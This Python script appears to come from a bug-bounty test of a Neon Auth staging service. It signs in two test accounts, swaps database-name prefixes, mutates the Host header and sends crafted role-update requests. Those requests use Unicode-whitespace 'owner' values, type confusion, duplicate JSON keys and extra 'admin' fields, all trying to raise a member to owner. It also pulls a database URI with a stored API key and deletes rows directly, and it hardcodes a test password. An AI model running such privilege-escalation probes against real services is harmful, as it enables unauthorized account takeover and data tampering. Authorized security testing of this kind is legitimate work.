# -*- coding: utf-8 -*-
"""V23: URL variants - db-name prefix swap + Host mutation (read-only probes)
V24: body deep variants on U2's membership (U1 keeps owner control)
   - unicode whitespace roles, type confusion, dup keys"""
import json, ssl, time, http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
ctx = ssl.create_default_context()
PASS = "SecTest!2026pass"
U1 = "libobo1229+na_org1@gmail.com"
U2 = "libobo1229+na_org2@gmail.com"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def na(method, path, body=None, cookie=None, origin="http://localhost:3000",
      raw=None, timeout=25):
    try:
        conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
        hdrs = {"Content-Type": "application/json", "Origin": origin,
                "User-Agent": "Mozilla/5.0", "Accept": "application/json"}
        if cookie:
            hdrs["Cookie"] = cookie
        payload = raw.encode() if raw is not None else (json.dumps(body).encode() if body is not None else None)
        conn.request(method, path, payload, headers=hdrs)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", "replace")
        ck = resp.getheader("Set-Cookie", "")
        conn.close()
        time.sleep(0.25)
        return resp.status, data, ck
    except Exception as e:
        time.sleep(0.25)
        return None, str(e)[:110], ""


def auth(email):
    st, data, ck = na("POST", "/neondb/auth/sign-in/email",
                      {"email": email, "password": PASS})
    return ck.split(";")[0] if st in (200, 201) else None


def main():
    out("== V23 URL variants + V24 body deep ==")
    c1 = auth(U1)
    c2 = auth(U2)
    out("cookies: %s/%s" % (bool(c1), bool(c2)))
    if not (c1 and c2):
        return
    # ---- V23A: db-name prefix swap ----
    out("-- db prefix variants --")
    for pre in ("neondb", "postgres", "main", "db2", "neondb2", "NeonDB", "neon%64b"):
        st, d, _ = na("GET", "/%s/auth/organization/list" % pre, cookie=c1)
        out("%-10s -> %s %s" % (pre, st, d[:70]))
    # ---- V23B: Host mutation ----
    out("-- Host mutation --")
    hosts = [("trailing dot", NA_HOST + "."), ("UPPER", NA_HOST.upper()),
             ("console", "console-stage.neon.build"),
             ("alt-neonauth", "neonauth.us-east-2.aws.neon.build"),
             ("x-prefix", "x-" + NA_HOST)]
    for tag, h in hosts:
        try:
            conn = http.client.HTTPSConnection(h, timeout=15, context=ctx)
            conn.request("GET", "/neondb/auth/organization/list", headers={
                "Cookie": c1, "User-Agent": "Mozilla/5.0"})
            resp = conn.getresponse()
            data = resp.read().decode("utf-8", "replace")
            conn.close()
            out("%-12s -> %s %s" % (tag, resp.status, data[:70]))
        except Exception as e:
            out("%-12s -> ERR %s" % (tag, str(e)[:80]))
    # ---- V24 setup: v24 org, invite U2, U2 accept ----
    # cleanup leftovers from crashed run (org cd777a92) before creating new
    st, d, _ = na("POST", "/neondb/auth/organization/delete", {"organizationId": "cd777a92-8c21-436e-a256-7621930607fe"}, c1)
    out("cleanup stale org -> %d %s" % (st, d[:80]))
    st, d, _ = na("POST", "/neondb/auth/organization/create",
                  {"name": "v24-org", "slug": "v24%d" % int(time.time())}, c1)
    org = json.loads(d).get("id") if st == 200 else None
    out("org=%s" % org)
    if not org:
        return
    em2 = U2  # invite U2's real login email so U2 can accept
    st, d, _ = na("POST", "/neondb/auth/organization/invite-member",
                  {"organizationId": org, "email": em2, "role": "member"}, c1)
    out("invite -> %d %s" % (st, d[:120]))
    st, d, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                  {"organizationId": org}, c2)
    out("U2 accept -> %d" % st)
    # find U2's member row: sign-in U2 again then use invitations/list or DB
    import re
    mid = None
    m = re.search(r'"id":"([0-9a-f-]{36})"', d)
    if st == 200 and m:
        # accept may return org+members; try list-of-members path
        pass
    # fetch member list via organization/members (V15 said get-members 404; try variations)
    for p in ("/neondb/auth/organization/members?organizationId=%s" % org,
              "/neondb/auth/organization/members/%s" % org,
              "/neondb/auth/organization/get-members?organizationId=%s" % org):
        st, d, _ = na("GET", p, cookie=c1)
        if st == 200:
            out("members via %s -> %s" % (p.split("?")[0], d[:180]))
            break
    # DB fallback: find member row id for U2's user
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    import http.client as hc
    conn = hc.HTTPSConnection("console-stage.neon.build", timeout=30, context=ctx)
    conn.request("GET", "/api/v2/projects/orange-sun-90493739/connection_uri"
                 "?database_name=neondb&role_name=neondb_owner"
                 "&branch_id=br-wandering-field-w2ob6mpn",
                 headers={"X-Bug-Bounty": "xxbo",
                          "Authorization": "Bearer " + json.load(open(r"F:\scan\neon_report\_apikey.json"))["key"]})
    r = conn.getresponse()
    uri = json.loads(r.read().decode())["uri"]
    conn.close()
    p = urlsplit(uri)
    q = [(k, v) for k, v in parse_qsl(p.query) if k != "channel_binding"]
    uri2 = urlunsplit((p.scheme, p.netloc, p.path, urlencode(q), p.fragment))
    import psycopg
    with psycopg.connect(uri2, connect_timeout=15) as conn:
        conn.autocommit = True
        with conn.cursor() as cur:
            cur.execute("SELECT u.id FROM neon_auth.user u WHERE u.email=%s", (em2,))
            rows = cur.fetchall()
            u2id = str(rows[0][0]) if rows else None
            out("U2 userId=%s" % u2id)
            if u2id:
                cur.execute('SELECT id FROM neon_auth.member WHERE "organizationId"=%s AND "userId"=%s',
                            (org, u2id))
                r2 = cur.fetchall()
                mid = str(r2[0][0]) if r2 else None
                out("U2 memberId=%s" % mid)
    if not mid:
        out("cannot get U2 memberId - abort")
        return
    # ---- V24 probes against U2's membership (U1 is owner) ----
    probes = [
        ("role=owner U+3000", {"memberId": mid, "role": "owner\u3000"}),
        ("role=owner NBSP", {"memberId": mid, "role": "owner\u00a0"}),
        ("role=owner EM", {"memberId": mid, "role": "owner\u2003"}),
        ("role=member ctrl", {"memberId": mid, "role": "member"}),
        ("memberId=123", {"memberId": 123, "role": "member"}),
        ("memberId=null", {"memberId": None, "role": "member"}),
        ("memberId=array", {"memberId": [mid], "role": "member"}),
        ("role=array", {"memberId": mid, "role": ["owner"]}),
        ("dup role o,m", '{"memberId":"%s","role":"owner","role":"member"}' % mid),
        ("dup role m,o", '{"memberId":"%s","role":"member","role":"owner"}' % mid),
        ("extra field", {"memberId": mid, "role": "member", "admin": True}),
    ]
    for tag, b in probes:
        if isinstance(b, str):
            st, data, _ = na("POST", "/neondb/auth/organization/update-member-role",
                             raw=b, cookie=c1)
        else:
            st, data, _ = na("POST", "/neondb/auth/organization/update-member-role",
                             b, cookie=c1)
        out("%-18s -> %s %s" % (tag, st, data[:90]))
    # post-check U2 role in DB
    with psycopg.connect(uri2, connect_timeout=15) as conn:
        conn.autocommit = True
        with conn.cursor() as cur:
            cur.execute('SELECT role FROM neon_auth.member WHERE id=%s', (mid,))
            out("final U2 role: %r" % (cur.fetchall()[0][0],))
    # cleanup: delete org as owner + db purge
    st, d, _ = na("POST", "/neondb/auth/organization/delete", {"organizationId": org}, c1)
    out("cleanup delete -> %s %s" % (st, d[:100]))
    with psycopg.connect(uri2, connect_timeout=15) as conn:
        conn.autocommit = True
        with conn.cursor() as cur:
            cur.execute("DELETE FROM neon_auth.organization WHERE id=%s", (org,))
            cur.execute("DELETE FROM neon_auth.member WHERE \"organizationId\"=%s", (org,))
            cur.execute("DELETE FROM neon_auth.invitation WHERE \"organizationId\"=%s", (org,))
    out("done")


if __name__ == "__main__":
    main()
